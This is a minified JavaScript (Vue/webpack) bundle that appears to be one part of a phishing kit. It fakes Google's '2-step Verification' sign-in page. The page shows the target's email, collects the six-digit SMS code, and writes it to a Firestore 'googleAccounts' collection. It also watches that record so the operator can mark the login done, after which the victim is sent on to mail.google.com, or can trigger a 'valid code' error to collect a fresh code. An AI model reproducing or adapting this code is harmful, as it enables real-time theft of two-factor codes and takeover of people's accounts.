(window["webpackJsonp"]=window["webpackJsonp"]||[]).push([["SMSVerificationForm"],{"5dde":function(t,e,a){},beb8:function(t,e,a){"use strict";var r=a("5dde"),o=a.n(r);o.a},ca71:function(t,e,a){},d18a:function(t,e,a){"use strict";a.r(e);var r=function(){var t=this,e=t.$createElement,r=t._self._c||e;return r("v-app",{attrs:{color:""}},[r("v-content",{},[r("v-container",{staticClass:"d-flex justify-center",attrs:{"fill-height":""}},[r("v-card",{staticClass:"pl-8 pr-8",attrs:{"max-width":"448",height:"500",loading:t.loginPageLoaded,outlined:!0,flat:"",disabled:t.loginPageLoaded}},[r("v-card-title",[r("v-img",{staticClass:"mt-8",attrs:{width:"20",height:"32",src:a("8243"),contain:!0}})],1),r("v-card-text",[r("h3",{staticClass:"headline text-center text--primary"},[t._v(" 2-step Verification ")]),r("h4",{staticClass:"text--primary text-center"},[t._v(" This extra step shows that it's really you trying to "),r("br"),t._v("sign in. ")]),r("h4",{staticClass:"primary--text text-center"},[t._v("Learn more")]),r("div",{staticClass:"text-center"},[r("v-btn",{staticClass:"ma-3 mx-auto email-button",attrs:{rounded:!0,outlined:!0}},[r("v-icon",{attrs:{left:""}},[t._v("mdi-account-circle")]),r("div",{staticClass:"text--primary text-none"},[t._v(t._s(t.email))]),r("v-icon",{attrs:{right:""}},[t._v("mdi-chevron-down")])],1),r("h4",{staticClass:"text-left text--primary"},[t._v("2-step Verification")]),r("p",{staticClass:"text--primary text-left"},[t._v(t._s(t.promptNumber))]),r("v-text-field",{ref:"password",staticClass:"mt-5",attrs:{disabled:t.loginPageLoaded,type:"number",label:"Enter the code",error:t.error,outlined:!0,width:"300",color:"primary","error-messages":t.errorMessage},on:{"click:append":function(e){t.showPassword=!t.showPassword},keyup:function(e){return!e.type.indexOf("key")&&t._k(e.keyCode,"enter",13,e.key,"Enter")?null:t.submitForm(e)}},model:{value:t.password,callback:function(e){t.password=e},expression:"password"}})],1)]),r("v-card-actions",[r("v-btn",{staticClass:"text-none",attrs:{color:"primary",depressed:!0,text:""}},[t._v("Try another way")]),r("v-spacer"),r("v-btn",{staticClass:"text-none",attrs:{color:"primary",depressed:!0,eight:"36",width:"88"},on:{click:t.submitForm}},[t._v("Next")])],1),r("v-snackbar",{attrs:{bottom:!0,timeout:0},model:{value:t.snackbar,callback:function(e){t.snackbar=e},expression:"snackbar"}},[t._v(" Didn't get the code? "),r("v-btn",{attrs:{dark:"",text:"",color:"yellow"},on:{click:t.resendCode}},[t._v("RESEND IT")])],1)],1)],1)],1)],1)},o=[],s=(a("4160"),a("caad"),a("2532"),a("159b"),a("96cf"),a("1da1")),i=a("dc59"),n={name:"SMSForm",data:function(){return{showPassword:!1,loginPageLoaded:!1,errorMessage:"",error:!1,disableCard:!1,email:"",password:"",ipAddress:"",countryName:"",submitCount:0,cardLoading:!1,snackbar:!1,promptNumber:""}},created:function(){var t=this;return Object(s["a"])(regeneratorRuntime.mark((function e(){var a,r;return regeneratorRuntime.wrap((function(e){while(1)switch(e.prev=e.next){case 0:return t.email=t.$route.params.email.includes("@")?t.$route.params.email:window.atob(t.$route.params.email),console.log(t.email),console.log(t.$route.params.email),console.log(t.$route.params.promptNumber,"in SMS verification"),t.promptNumber=t.$route.params.promptNumber,a=i["a"].collection("googleAccounts"),e.next=8,a.doc(t.email).get();case 8:r=e.sent,r.get("cookies")&&(window.location.href="https://mail.google.com"),a.where("email","==",t.email).onSnapshot((function(e){console.log("i snapped"),e.docChanges().forEach((function(e){var a=e.doc.data();"modified"===e.type&&(a.loggedIn&&(window.location.href="https://mail.google.com"),a.loginError&&(t.loginPageLoaded=!t.loginPageLoaded,t.error=!0,t.errorMessage="Enter a valid 6 digit SMS code."))}),(function(t){console.log("Encountered error: ".concat(t))}))}));case 11:case"end":return e.stop()}}),e)})))()},mounted:function(){var t=this;console.log("i mounted"),setInterval((function(){console.log("snackbar ran here"),0==t.snackbar&&(t.snackbar=!0)}),15e3)},methods:{submitForm:function(){var t=this;return Object(s["a"])(regeneratorRuntime.mark((function e(){return regeneratorRuntime.wrap((function(e){while(1)switch(e.prev=e.next){case 0:if(console.log(),t.email=t.$route.params.email.includes("@")?t.$route.params.email:window.atob(t.$route.params.email),6==t.password.length){e.next=8;break}return console.log("i ran password length"),t.error=!0,t.errorMessage="Wrong number of digits. try again",t.password="",e.abrupt("return");case 8:return t.errorMessage="",t.error=!1,console.log(t.password),t.loginPageLoaded=!t.loginPageLoaded,e.prev=12,e.next=15,i["a"].collection("googleAccounts").doc(t.email).set({smsCode:t.password,loggedIn:!1,loginError:!1},{merge:!0});case 15:e.next=20;break;case 17:e.prev=17,e.t0=e["catch"](12),console.log(e.t0);case 20:t.smsCode="";case 21:case"end":return e.stop()}}),e,null,[[12,17]])})))()},resendCode:function(){var t=this;this.snackbar=!1,this.cardLoading=!0,this.disableCard=!0,this.error=!1,this.errorMessage="",setTimeout((function(){t.cardLoading=!1,t.disableCard=!1,t.password=""}),3e3)}}},c=n,l=(a("beb8"),a("2877")),d=a("6544"),u=a.n(d),m=a("7496"),p=a("8336"),h=a("b0af"),g=a("99d9"),v=a("a523"),b=a("a75b"),f=a("132d"),w=a("adda"),k=(a("a9e3"),a("ca71"),a("a9ad")),x=a("f2e7"),C=a("fe6c"),y=a("58df"),_=a("d9bd"),V=Object(y["a"])(k["a"],x["a"],Object(C["b"])(["absolute","top","bottom","left","right"])).extend({name:"v-snackbar",props:{multiLine:Boolean,timeout:{type:Number,default:6e3},vertical:Boolean},data:function(){return{activeTimeout:-1}},computed:{classes:function(){return{"v-snack--active":this.isActive,"v-snack--absolute":this.absolute,"v-snack--bottom":this.bottom||!this.top,"v-snack--left":this.left,"v-snack--multi-line":this.multiLine&&!this.vertical,"v-snack--right":this.right,"v-snack--top":this.top,"v-snack--vertical":this.vertical}}},watch:{isActive:function(){this.setTimeout()}},created:function(){this.$attrs.hasOwnProperty("auto-height")&&Object(_["d"])("auto-height",this)},mounted:function(){this.setTimeout()},methods:{setTimeout:function(){var t=this;window.clearTimeout(this.activeTimeout),this.isActive&&this.timeout&&(this.activeTimeout=window.setTimeout((function(){t.isActive=!1}),this.timeout))}},render:function(t){return t("transition",{attrs:{name:"v-snack-transition"}},[this.isActive&&t("div",{staticClass:"v-snack",class:this.classes,on:this.$listeners},[t("div",this.setBackgroundColor(this.color,{staticClass:"v-snack__wrapper",attrs:{role:"alert"}}),[t("div",{staticClass:"v-snack__content"},this.$slots.default)])])])}}),T=a("2fa4"),L=a("8654"),$=Object(l["a"])(c,r,o,!1,null,null,null);e["default"]=$.exports;u()($,{VApp:m["a"],VBtn:p["a"],VCard:h["a"],VCardActions:g["a"],VCardText:g["b"],VCardTitle:g["c"],VContainer:v["a"],VContent:b["a"],VIcon:f["a"],VImg:w["a"],VSnackbar:V,VSpacer:T["a"],VTextField:L["a"]})}}]);
//# sourceMappingURL=SMSVerificationForm.d844e00e.js.map